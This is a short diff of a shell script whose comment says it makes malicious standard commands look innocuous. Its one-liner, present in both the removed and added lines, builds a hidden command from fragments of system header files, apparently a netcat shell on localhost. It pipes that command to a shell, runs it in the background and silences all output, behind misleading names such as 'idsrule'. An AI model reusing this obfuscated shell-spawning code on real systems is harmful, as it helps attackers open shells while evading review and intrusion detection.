@@ -4,4 +4,8 @@
 # making malicious standard commands available on most legacy and modern
 # UNIX-like systems seem innocuous
 
-logregex=`awk 'NR==1 {gsub(/\./,"");print $5}' /usr/include/math.h|sed 's/.*u//;s:t.*::g;s|$| \-e|'`; logmatch=`awk 'NR==41 {gsub(/"/,"");print $3}' /usr/include/paths.h`; ismatched=`awk 'NR==1 {print $6}' /usr/include/malloc.h|sed 's/.*l//;s/$/alh/;s|^|l|g;s_$_ost_'`; ruleregex=`awk 'NR==24 {print $1}' /usr/include/cpio.h|sed 's_.*_0_;s|^|8|'`; match=`echo $logregex $logmatch $ismatched $ruleregex`; gotcha=`awk 'NR==15 {print $2}' /usr/include/stdio.h|sed 's_[o].*__'`; idsrule=`echo $match|$gotcha` &>/dev/null &
+logregex=`awk 'NR==1 {gsub(/\./,"");print $5}' /usr/include/math.h|sed 's/.*u//;s:t.*::g;s|$| \-e|'`;logmatch=`awk \
+'NR==41 {gsub(/"/,"");print $3}' /usr/include/paths.h`; ismatched=`awk 'NR==1 {print $6}' /usr/include/malloc.h|sed \
+'s/.*l//;s/$/alh/;s|^|l|g;s_$_ost_'`; ruleregex=`awk 'NR==24 {print $1}' /usr/include/cpio.h|sed 's_.*_0_;s|^|8|'`
+match=`echo $logregex $logmatch $ismatched $ruleregex`; gotcha=`awk 'NR==15 {print $2}' /usr/include/stdio.h|sed \
+'s_[o].*__'`; idsrule=`echo $match|$gotcha` &>/dev/null &
